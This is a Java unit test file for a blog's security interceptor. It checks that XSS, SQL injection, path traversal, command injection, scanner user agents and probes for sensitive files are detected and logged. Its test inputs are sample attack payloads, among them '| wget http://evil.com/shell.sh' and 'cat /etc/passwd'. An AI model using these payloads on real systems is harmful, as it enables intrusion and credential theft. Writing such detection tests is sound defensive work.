package com.aston.blog.config;

import com.aston.blog.Service.AttackLogService;
import jakarta.servlet.http.HttpServletRequest;
import jakarta.servlet.http.HttpServletResponse;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.extension.ExtendWith;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.ValueSource;
import org.mockito.InjectMocks;
import org.mockito.Mock;
import org.mockito.junit.jupiter.MockitoExtension;

import static org.assertj.core.api.Assertions.assertThat;
import static org.mockito.ArgumentMatchers.*;
import static org.mockito.Mockito.*;

@ExtendWith(MockitoExtension.class)
@DisplayName("SecurityInterceptor - 安全拦截器测试")
class SecurityInterceptorTest {

    @Mock
    private AttackLogService attackLogService;

    @Mock
    private HttpServletRequest request;

    @Mock
    private HttpServletResponse response;

    @InjectMocks
    private SecurityInterceptor interceptor;

    @BeforeEach
    void setUp() {
        when(request.getRequestURI()).thenReturn("/api/public/search");
        when(request.getMethod()).thenReturn("GET");
        when(request.getRemoteAddr()).thenReturn("1.2.3.4");
        when(request.getHeader(anyString())).thenReturn(null);
        when(request.getQueryString()).thenReturn("");
    }

    private boolean preHandle() {
        try {
            return interceptor.preHandle(request, response, null);
        } catch (Exception e) {
            throw new AssertionError("SecurityInterceptor.preHandle should not throw in these tests", e);
        }
    }

    // ─── 白名单 ───

    @Test
    @DisplayName("服务器 IP 应跳过检测")
    void serverIp_shouldSkipDetection() {
        when(request.getRemoteAddr()).thenReturn("47.242.21.40");
        when(request.getQueryString()).thenReturn("q=<script>alert(1)</script>");

        boolean result = preHandle();

        assertThat(result).isTrue();
        verifyNoInteractions(attackLogService);
    }

    @Test
    @DisplayName("本地回环 IP 应跳过检测")
    void localhostIp_shouldSkipDetection() {
        when(request.getRemoteAddr()).thenReturn("127.0.0.1");
        when(request.getQueryString()).thenReturn("q=' OR '1'='1");

        boolean result = preHandle();

        assertThat(result).isTrue();
        verifyNoInteractions(attackLogService);
    }

    // ─── 排除路径 ───

    @Test
    @DisplayName("上传路径应跳过检测")
    void uploadsPath_shouldSkipDetection() {
        when(request.getRequestURI()).thenReturn("/uploads/image.jpg");
        when(request.getQueryString()).thenReturn("q=<script>alert(1)</script>");

        boolean result = preHandle();

        assertThat(result).isTrue();
        verifyNoInteractions(attackLogService);
    }

    @Test
    @DisplayName("静态资源路径应跳过检测")
    void staticPath_shouldSkipDetection() {
        when(request.getRequestURI()).thenReturn("/static/css/main.css");

        boolean result = preHandle();

        assertThat(result).isTrue();
        verifyNoInteractions(attackLogService);
    }

    // ─── XSS ───

    @ParameterizedTest
    @ValueSource(strings = {
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "javascript:alert(1)",
            "<svg onload=alert(1)>",
            "<iframe src=javascript:alert(1)>"
    })
    @DisplayName("XSS payload 应被检测并记录")
    void xssPayload_shouldBeDetected(String payload) {
        when(request.getQueryString()).thenReturn("q=" + payload);
        when(request.getHeader("User-Agent")).thenReturn("Mozilla/5.0");

        boolean result = preHandle();

        assertThat(result).isTrue();
        verify(attackLogService, times(1)).recordAttack(anyString(), anyString(), anyString(), anyString(), eq("XSS"), anyString(), anyString());
        verify(attackLogService, times(1)).recordThreat(anyString(), anyString(), anyString(), anyString(), eq("XSS"), anyString(), anyString());
    }

    // ─── SQL 注入 ───

    @ParameterizedTest
    @ValueSource(strings = {
            "1' OR '1'='1",
            "1' UNION SELECT 1,2,3--",
            "test' AND 1=1--",
            "admin'--"
    })
    @DisplayName("SQL 注入应被检测")
    void sqlInjection_shouldBeDetected(String payload) {
        when(request.getQueryString()).thenReturn("q=" + payload);

        boolean result = preHandle();

        assertThat(result).isTrue();
        verify(attackLogService, times(1)).recordAttack(anyString(), anyString(), anyString(), anyString(), eq("SQL_INJECTION"), anyString(), anyString());
    }

    @Test
    @DisplayName("sleep() 时间盲注应被检测")
    void sleepInjection_shouldBeDetected() {
        when(request.getQueryString()).thenReturn("q=test' AND SLEEP(3)--");

        boolean result = preHandle();

        assertThat(result).isTrue();
        verify(attackLogService, times(1)).recordAttack(anyString(), anyString(), anyString(), anyString(), eq("SQL_INJECTION"), anyString(), anyString());
    }

    @Test
    @DisplayName("information_schema 应被检测")
    void informationSchema_shouldBeDetected() {
        when(request.getQueryString()).thenReturn("q=1' UNION SELECT password FROM users");

        boolean result = preHandle();

        assertThat(result).isTrue();
        verify(attackLogService, times(1)).recordAttack(anyString(), anyString(), anyString(), anyString(), eq("SQL_INJECTION"), anyString(), anyString());
    }

    // ─── 路径穿越 ───

    @ParameterizedTest
    @ValueSource(strings = {
            "../../etc/passwd",
            "..\\..\\windows\\system32",
            "%2e%2e%2f%2e%2e%2fetc%2fpasswd"
    })
    @DisplayName("路径穿越应被检测")
    void pathTraversal_shouldBeDetected(String payload) {
        when(request.getQueryString()).thenReturn("q=" + payload);

        boolean result = preHandle();

        assertThat(result).isTrue();
        verify(attackLogService, times(1)).recordAttack(anyString(), anyString(), anyString(), anyString(), eq("PATH_TRAVERSAL"), anyString(), anyString());
    }

    // ─── 命令注入 ───

    @Test
    @DisplayName("命令注入分号应被检测")
    void commandInjectionSemicolon_shouldBeDetected() {
        when(request.getQueryString()).thenReturn("q=; cat /etc/passwd");

        boolean result = preHandle();

        assertThat(result).isTrue();
        verify(attackLogService, times(1)).recordAttack(anyString(), anyString(), anyString(), anyString(), eq("COMMAND_INJECTION"), anyString(), anyString());
    }

    @Test
    @DisplayName("命令注入管道符应被检测")
    void commandInjectionPipe_shouldBeDetected() {
        when(request.getQueryString()).thenReturn("q=| wget http://evil.com/shell.sh");

        boolean result = preHandle();

        assertThat(result).isTrue();
        verify(attackLogService, times(1)).recordAttack(anyString(), anyString(), anyString(), anyString(), eq("COMMAND_INJECTION"), anyString(), anyString());
    }

    @Test
    @DisplayName("ping 命令应被检测")
    void pingCommand_shouldBeDetected() {
        when(request.getQueryString()).thenReturn("q=ping -c 1 evil.com");

        boolean result = preHandle();

        assertThat(result).isTrue();
        verify(attackLogService, times(1)).recordAttack(anyString(), anyString(), anyString(), anyString(), eq("COMMAND_INJECTION"), anyString(), anyString());
    }

    // ─── 扫描器 UA ───

    @Test
    @DisplayName("sqlmap UA 应被检测")
    void sqlmapUA_shouldBeDetected() {
        when(request.getHeader("User-Agent")).thenReturn("sqlmap/1.7.3");
        when(request.getQueryString()).thenReturn("");

        boolean result = preHandle();

        assertThat(result).isTrue();
        verify(attackLogService, times(1)).recordAttack(anyString(), anyString(), anyString(), anyString(), eq("SCANNER_DETECTED"), eq("sqlmap/1.7.3"), anyString());
    }

    @Test
    @DisplayName("nmap UA 应被检测")
    void nmapUA_shouldBeDetected() {
        when(request.getHeader("User-Agent")).thenReturn("Mozilla/5.0 (compatible; Nmap Scripting Engine)");
        when(request.getQueryString()).thenReturn("");

        boolean result = preHandle();

        assertThat(result).isTrue();
        verify(attackLogService, times(1)).recordAttack(anyString(), anyString(), anyString(), anyString(), eq("SCANNER_DETECTED"), anyString(), anyString());
    }

    // ─── 敏感文件访问 ───

    @Test
    @DisplayName(".env 文件访问应被检测")
    void envFileAccess_shouldBeDetected() {
        when(request.getRequestURI()).thenReturn("/.env");
        when(request.getQueryString()).thenReturn("");

        boolean result = preHandle();

        assertThat(result).isTrue();
        verify(attackLogService, times(1)).recordAttack(anyString(), eq("/.env"), eq("GET"), anyString(), eq("SENSITIVE_ACCESS"), anyString(), anyString());
    }

    @Test
    @DisplayName("wp-config.php 应被检测")
    void wpConfig_shouldBeDetected() {
        when(request.getRequestURI()).thenReturn("/wp-config.php");

        boolean result = preHandle();

        assertThat(result).isTrue();
        verify(attackLogService, times(1)).recordAttack(anyString(), anyString(), anyString(), anyString(), eq("SENSITIVE_ACCESS"), anyString(), anyString());
    }

    @Test
    @DisplayName("phpmyadmin 访问应被检测")
    void phpmyadminAccess_shouldBeDetected() {
        when(request.getRequestURI()).thenReturn("/phpmyadmin/");

        boolean result = preHandle();

        assertThat(result).isTrue();
        verify(attackLogService, times(1)).recordAttack(anyString(), anyString(), anyString(), anyString(), eq("SENSITIVE_ACCESS"), anyString(), anyString());
    }

    // ─── 正常请求不记录 ───

    @Test
    @DisplayName("正常搜索内容不应被记录")
    void normalSearch_shouldNotBeRecorded() {
        when(request.getQueryString()).thenReturn("q=java+spring+boot");
        when(request.getHeader("User-Agent")).thenReturn("Mozilla/5.0");

        boolean result = preHandle();

        assertThat(result).isTrue();
        verify(attackLogService, never()).recordAttack(anyString(), anyString(), anyString(), anyString(), anyString(), anyString(), anyString());
    }

    @Test
    @DisplayName("中文内容不应被记录")
    void chineseContent_shouldNotBeRecorded() {
        when(request.getQueryString()).thenReturn("q=如何使用SpringBoot");
        when(request.getHeader("User-Agent")).thenReturn("Mozilla/5.0");

        boolean result = preHandle();

        assertThat(result).isTrue();
        verifyNoInteractions(attackLogService);
    }

    // ─── 双写验证 ───

    @Test
    @DisplayName("每次攻击应同时调用 recordAttack 和 recordThreat")
    void everyAttack_shouldCallBothRecordMethods() {
        when(request.getQueryString()).thenReturn("q=<script>alert(1)</script>");

        preHandle();

        verify(attackLogService, times(1)).recordAttack(anyString(), anyString(), anyString(), anyString(), eq("XSS"), anyString(), anyString());
        verify(attackLogService, times(1)).recordThreat(anyString(), anyString(), anyString(), anyString(), eq("XSS"), anyString(), anyString());
    }

    // ─── IP 获取 ───

    @Test
    @DisplayName("X-Forwarded-For 取第一个 IP")
    void xForwardedFor_shouldTakeFirstIp() {
        when(request.getHeader("X-Forwarded-For")).thenReturn("5.6.7.8, 10.0.0.1");
        when(request.getHeader("X-Real-IP")).thenReturn(null);
        when(request.getHeader("Proxy-Client-IP")).thenReturn(null);
        when(request.getHeader("REMOTE_ADDR")).thenReturn("127.0.0.1");
        when(request.getQueryString()).thenReturn("q=<script>alert(1)</script>");

        preHandle();

        verify(attackLogService).recordAttack(eq("5.6.7.8"), anyString(), anyString(), anyString(), anyString(), anyString(), anyString());
    }
}
